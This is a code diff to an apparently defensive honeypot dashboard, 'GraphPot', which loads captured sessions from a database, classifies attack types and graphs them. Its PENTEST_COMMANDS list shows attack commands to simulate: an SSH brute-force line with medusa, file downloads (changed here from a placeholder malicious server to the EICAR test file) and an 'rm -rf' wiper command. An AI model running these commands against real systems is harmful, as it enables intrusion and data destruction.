@@ -56,14 +56,14 @@ BRUTE_FORCE_THRESHOLD = 5
 
 # --- Attack Color Mapping ---
 ATTACK_COLORS = {
-    "Brute Force Attack": "#D1ECF1",  # Light blue
-    "Destructive Attack (Wiper)": "#FFB6B6",  # Light red
-    "Malware Download Attempt": "#FFF3CD",  # Light yellow
-    "Reconnaissance / Enumeration": "#E2E3E5",  # Light gray
-    "Port Scanning / Connection Attempt": "#D4EDDA",  # Light green
-    "Command Injection Attempt": "#F8D7DA",  # Light pink
-    "Successful Login": "#D1E7DD",  # Light teal
-    "Failed Login": "#F8F9FA"  # Light white
+    "Brute Force Attack": "#D1ECF1",
+    "Destructive Attack (Wiper)": "#FFB6B6",
+    "Malware Download Attempt": "#FFF3CD",
+    "Reconnaissance / Enumeration": "#E2E3E5",
+    "Port Scanning / Connection Attempt": "#D4EDDA",
+    "Command Injection Attempt": "#F8D7DA",
+    "Successful Login": "#D1E7DD",
+    "Failed Login": "#F8F9FA"
 }
 
 # --- Penetration Testing Commands ---
@@ -73,8 +73,8 @@ PENTEST_COMMANDS = {
         "medusa -h <TARGET_IP> -U users.txt -P passwords.txt -M ssh"
     ],
     "Malware Download Attempt": [
-        "wget http://<MALICIOUS_SERVER>/malware.sh -O /tmp/malware.sh",
-        "curl -o /tmp/malware.exe http://<MALICIOUS_SERVER>/malware.exe"
+        "wget http://www.eicar.org/download/eicar.com -O /tmp/eicar_test",
+        "curl -o /tmp/eicar_test http://www.eicar.org/download/eicar.com.txt"
     ],
     "Destructive Attack (Wiper)": [
         "rm -rf /important/directory/*",
@@ -90,47 +90,74 @@ PENTEST_COMMANDS = {
     ]
 }
 
-# --- Optimized Functions ---
+# --- Database Functions ---
 @st.cache_resource
 def get_connection():
-    return psycopg2.connect(
-        host=DB_HOST,
-        dbname=DB_NAME,
-        user=DB_USER,
-        password=DB_PASS,
-        port=DB_PORT,
-        cursor_factory=RealDictCursor,
-        sslmode='require'
-    )
+    """Create and cache database connection"""
+    try:
+        conn = psycopg2.connect(
+            host=DB_HOST,
+            dbname=DB_NAME,
+            user=DB_USER,
+            password=DB_PASS,
+            port=DB_PORT,
+            cursor_factory=RealDictCursor,
+            sslmode='require'
+        )
+        return conn
+    except Exception as e:
+        st.error(f"❌ Database connection failed: {str(e)}")
+        return None
+
+def execute_query(query):
+    """Execute SQL query with connection handling"""
+    conn = None
+    try:
+        conn = get_connection()
+        if conn is None:
+            return None
+            
+        with conn.cursor() as cur:
+            cur.execute(query)
+            if cur.description:  # If query returns results
+                return cur.fetchall()
+            return True
+    except Exception as e:
+        st.error(f"❌ Query failed: {str(e)}")
+        return None
+    finally:
+        if conn:
+            conn.close()
 
 @st.cache_data(ttl=60)
 def load_data():
-    conn = get_connection()
-    try:
-        with conn.cursor() as cur:
-            cur.execute("""
-                SELECT *, 
-                       COUNT(*) OVER (PARTITION BY src_ip, eventid) as attempt_count
-                FROM hornet7_data 
-                ORDER BY timestamp DESC 
-                LIMIT 500
-            """)
-            rows = cur.fetchall()
-            df = pd.DataFrame(rows)
-            
-            # Apply attack detection
-            attack_info = []
-            for _, row in df.iterrows():
-                attack_info.append(detect_attack_type(row))
-            
-            df['attack_type'] = [x[0] for x in attack_info]
-            df['attack_details'] = [x[1] for x in attack_info]
-            
-            return df
-    finally:
-        conn.close()
+    """Load and process data from database"""
+    query = """
+        SELECT *, 
+               COUNT(*) OVER (PARTITION BY src_ip, eventid) as attempt_count
+        FROM hornet7_data 
+        ORDER BY timestamp DESC 
+        LIMIT 500
+    """
+    rows = execute_query(query)
+    if rows is None:
+        return pd.DataFrame()
+    
+    df = pd.DataFrame(rows)
+    
+    # Apply attack detection
+    attack_info = []
+    for _, row in df.iterrows():
+        attack_info.append(detect_attack_type(row))
+    
+    df['attack_type'] = [x[0] for x in attack_info]
+    df['attack_details'] = [x[1] for x in attack_info]
+    
+    return df
 
+# --- Attack Detection ---
 def detect_attack_type(row):
+    """Classify attack type based on log entry"""
     eventid = row.get('eventid', '').lower()
     input_cmd = str(row.get('input', '')).lower()
     message = str(row.get('message', '')).lower()
@@ -163,14 +190,16 @@ def detect_attack_type(row):
     
     return "Unknown Activity", message[:100]
 
+# --- Visualization ---
 def build_session_graph(row):
+    """Create network graph for a session"""
     G = nx.DiGraph()
     src_ip = row.get('src_ip')
     eventid = row.get('eventid')
     dst_port = row.get('dst_port')
     attack_type = row.get('attack_type')
     
-    # Node colors based on attack type
+    # Node styling
     color_map = {
         "Brute Force Attack": "#FF6B6B",
         "Destructive Attack (Wiper)": "#FF0000",
@@ -212,141 +241,145 @@ def build_session_graph(row):
     return G
 
 # --- Dashboard Layout ---
-st.set_page_config(
-    page_title="GraphPot - Network Session Analysis", 
-    layout="wide",
-    initial_sidebar_state="expanded"
-)
-st.title("🛡️ GraphPot - Network Session Analysis")
-
-if st.button("🔄 Refresh"):
-    st.rerun()
-
-st.markdown("---")
-
-# Load data with progress indicator
-with st.spinner('Loading threat data...'):
-    df = load_data()
-
-if not df.empty:
-    # --- Summary Metrics ---
-    st.subheader("📊 Attack Summary")
-    cols = st.columns(4)
-    metrics = [
-        ("🔒 Brute Force", "Brute Force Attack"),
-        ("🐍 Malware Download", "Malware Download Attempt"),
-        ("🔥 Wiper Attack", "Destructive Attack (Wiper)"),
-        ("🕵️ Reconnaissance", "Reconnaissance / Enumeration")
-    ]
-    
-    for (icon, metric), col in zip(metrics, cols):
-        col.metric(icon, (df['attack_type'] == metric).sum())
-
-    st.markdown("---")
-
-    # --- Moving Marquee ---
-    top_ips = df['src_ip'].value_counts().head(3).index.tolist()
-    top_sessions = df['session'].value_counts().head(3).index.tolist()
-    top_events = df['eventid'].value_counts().head(3).index.tolist()
-
-    moving_text = f"Top IPs: {', '.join(top_ips)} | Top Sessions: {', '.join(top_sessions)} | Top Events: {', '.join(top_events)}"
-    st.markdown(
-        f'<marquee style="font-size: 18px; color: black; background-color: white; padding: 10px;">{moving_text}</marquee>',
-        unsafe_allow_html=True
+def main():
+    st.set_page_config(
+        page_title="GraphPot - Network Session Analysis", 
+        layout="wide",
+        initial_sidebar_state="expanded"
     )
+    st.title("🛡️ GraphPot - Network Session Analysis")
+
+    if st.button("🔄 Refresh"):
+        st.rerun()
 
     st.markdown("---")
 
-    # --- Penetration Testing Guide ---
-    with st.expander("🔓 Penetration Testing Commands (Click to Expand)"):
-        st.write("Use these commands to simulate attacks for testing:")
+    # Load data with progress indicator
+    with st.spinner('Loading threat data...'):
+        df = load_data()
+
+    if not df.empty:
+        # --- Summary Metrics ---
+        st.subheader("📊 Attack Summary")
+        cols = st.columns(4)
+        metrics = [
+            ("🔒 Brute Force", "Brute Force Attack"),
+            ("🐍 Malware Download", "Malware Download Attempt"),
+            ("🔥 Wiper Attack", "Destructive Attack (Wiper)"),
+            ("🕵️ Reconnaissance", "Reconnaissance / Enumeration")
+        ]
         
-        for attack_type, commands in PENTEST_COMMANDS.items():
-            st.markdown(f"**{attack_type}**")
-            for cmd in commands:
-                st.code(cmd, language='bash')
-            st.markdown("---")
+        for (icon, metric), col in zip(metrics, cols):
+            col.metric(icon, (df['attack_type'] == metric).sum())
 
-    # --- Highlight Table ---
-    st.subheader("📋 Latest Captured Sessions")
-    
-    def highlight_rows(row):
-        return ['background-color: ' + ATTACK_COLORS.get(row['attack_type'], '')] * len(row)
-    
-    attack_filter = st.selectbox("🔍 Filter by Attack Type:", ["All"] + sorted(df['attack_type'].unique()))
-    filtered_df = df if attack_filter == "All" else df[df['attack_type'] == attack_filter]
-    
-    st.dataframe(
-        filtered_df[['timestamp', 'src_ip', 'eventid', 'attack_type', 'dst_port']]
-        .style.apply(highlight_rows, axis=1),
-        use_container_width=True,
-        height=400
-    )
+        st.markdown("---")
 
-    st.markdown("---")
+        # --- Moving Marquee ---
+        top_ips = df['src_ip'].value_counts().head(3).index.tolist()
+        top_sessions = df['session'].value_counts().head(3).index.tolist()
+        top_events = df['eventid'].value_counts().head(3).index.tolist()
 
-    # --- Network Session Mapping ---
-    st.subheader("🧠 Network Session Mapping")
-    
-    selected_session = st.selectbox(
-        "Select a Session ID to visualize:",
-        options=df['session'].unique()
-    )
+        moving_text = f"Top IPs: {', '.join(top_ips)} | Top Sessions: {', '.join(top_sessions)} | Top Events: {', '.join(top_events)}"
+        st.markdown(
+            f'<marquee style="font-size: 18px; color: black; background-color: white; padding: 10px;">{moving_text}</marquee>',
+            unsafe_allow_html=True
+        )
 
-    if selected_session:
-        selected_row = df[df['session'] == selected_session].iloc[0]
-        attack_type = selected_row['attack_type']
-        bg_color = ATTACK_COLORS.get(attack_type, "#FFFFFF")
+        st.markdown("---")
+
+        # --- Penetration Testing Guide ---
+        with st.expander("🔓 Penetration Testing Commands (Click to Expand)"):
+            st.write("Use these commands to simulate attacks for testing:")
+            
+            for attack_type, commands in PENTEST_COMMANDS.items():
+                st.markdown(f"**{attack_type}**")
+                for cmd in commands:
+                    st.code(cmd, language='bash')
+                st.markdown("---")
+
+        # --- Highlight Table ---
+        st.subheader("📋 Latest Captured Sessions")
         
-        with st.spinner('Generating attack graph...'):
-            G = build_session_graph(selected_row)
+        def highlight_rows(row):
+            return ['background-color: ' + ATTACK_COLORS.get(row['attack_type'], '')] * len(row)
+        
+        attack_filter = st.selectbox("🔍 Filter by Attack Type:", ["All"] + sorted(df['attack_type'].unique()))
+        filtered_df = df if attack_filter == "All" else df[df['attack_type'] == attack_filter]
+        
+        st.dataframe(
+            filtered_df[['timestamp', 'src_ip', 'eventid', 'attack_type', 'dst_port']]
+            .style.apply(highlight_rows, axis=1),
+            use_container_width=True,
+            height=400
+        )
+
+        st.markdown("---")
+
+        # --- Network Session Mapping ---
+        st.subheader("🧠 Network Session Mapping")
+        
+        selected_session = st.selectbox(
+            "Select a Session ID to visualize:",
+            options=df['session'].unique()
+        )
+
+        if selected_session:
+            selected_row = df[df['session'] == selected_session].iloc[0]
+            attack_type = selected_row['attack_type']
+            bg_color = ATTACK_COLORS.get(attack_type, "#FFFFFF")
             
-            # Configure stable visualization
-            net = Network(
-                height="700px", 
-                width="100%", 
-                directed=True, 
-                notebook=False,
-                cdn_resources="remote"
-            )
-            
-            # Stabilize the graph
-            net.force_atlas_2based(
-                gravity=-50,
-                central_gravity=0.01,
-                spring_length=100,
-                spring_strength=0.08,
-                damping=0.4,
-                overlap=0.1
-            )
-            
-            # Add nodes and edges
-            net.from_nx(G)
-            
-            # Save and display
-            with tempfile.NamedTemporaryFile(delete=False, suffix=".html") as tmp_file:
-                net.save_graph(tmp_file.name)
-                components.html(
-                    open(tmp_file.name, 'r', encoding='utf-8').read(), 
-                    height=700,
-                    width=None
+            with st.spinner('Generating attack graph...'):
+                G = build_session_graph(selected_row)
+                
+                # Configure stable visualization
+                net = Network(
+                    height="700px", 
+                    width="100%", 
+                    directed=True, 
+                    notebook=False,
+                    cdn_resources="remote"
                 )
-            os.unlink(tmp_file.name)
+                
+                # Stabilize the graph
+                net.force_atlas_2based(
+                    gravity=-50,
+                    central_gravity=0.01,
+                    spring_length=100,
+                    spring_strength=0.08,
+                    damping=0.4,
+                    overlap=0.1
+                )
+                
+                # Add nodes and edges
+                net.from_nx(G)
+                
+                # Save and display
+                with tempfile.NamedTemporaryFile(delete=False, suffix=".html") as tmp_file:
+                    net.save_graph(tmp_file.name)
+                    components.html(
+                        open(tmp_file.name, 'r', encoding='utf-8').read(), 
+                        height=700,
+                        width=None
+                    )
+                os.unlink(tmp_file.name)
 
-        # Session details with colored background
-        st.markdown(f"""
-        <div style="background-color:{bg_color}; padding:15px; border-radius:10px">
-        <h4>Session Details</h4>
-        <p><b>Source IP:</b> <code>{selected_row.get('src_ip', 'N/A')}</code></p>
-        <p><b>Attack Type:</b> <code>{attack_type}</code></p>
-        <p><b>Target Port:</b> <code>{selected_row.get('dst_port', 'N/A')}</code></p>
-        <p><b>Timestamp:</b> <code>{selected_row.get('timestamp', 'N/A')}</code></p>
-        <p><b>Details:</b> <code>{selected_row.get('attack_details', 'N/A')}</code></p>
-        </div>
-        """, unsafe_allow_html=True)
+            # Session details with colored background
+            st.markdown(f"""
+            <div style="background-color:{bg_color}; padding:15px; border-radius:10px">
+            <h4>Session Details</h4>
+            <p><b>Source IP:</b> <code>{selected_row.get('src_ip', 'N/A')}</code></p>
+            <p><b>Attack Type:</b> <code>{attack_type}</code></p>
+            <p><b>Target Port:</b> <code>{selected_row.get('dst_port', 'N/A')}</code></p>
+            <p><b>Timestamp:</b> <code>{selected_row.get('timestamp', 'N/A')}</code></p>
+            <p><b>Details:</b> <code>{selected_row.get('attack_details', 'N/A')}</code></p>
+            </div>
+            """, unsafe_allow_html=True)
 
-else:
-    st.warning("⚠️ No data found.")
+    else:
+        st.warning("⚠️ No data found. Check database connection if this persists.")
 
-# Auto-refresh every 2 minutes
-st_autorefresh(interval=120000, key="data_refresh")
+    # Auto-refresh every 2 minutes
+    st_autorefresh(interval=120000, key="data_refresh")
+
+if __name__ == "__main__":
+    main()
